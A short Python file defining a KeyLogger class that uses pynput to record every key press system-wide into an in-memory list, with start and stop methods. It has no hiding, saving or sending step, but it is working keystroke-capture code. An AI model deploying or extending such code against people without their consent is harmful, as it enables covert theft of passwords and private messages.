from pynput.keyboard import Listener
from InterFace import KeyLoggerSystem

class KeyLogger(KeyLoggerSystem):
    def __init__(self):
        self.listener = Listener(on_press=self.on_press)
        self.logged_keys = []

    def on_press(self, key):
        self.logged_keys.append(key)

    def start_listening(self):
        with self.listener:
            self.listener.join()

    def stop_listening(self):
        self.listener.stop()


if __name__ == '__main__':
    kl = KeyLogger()
    kl.start_listening()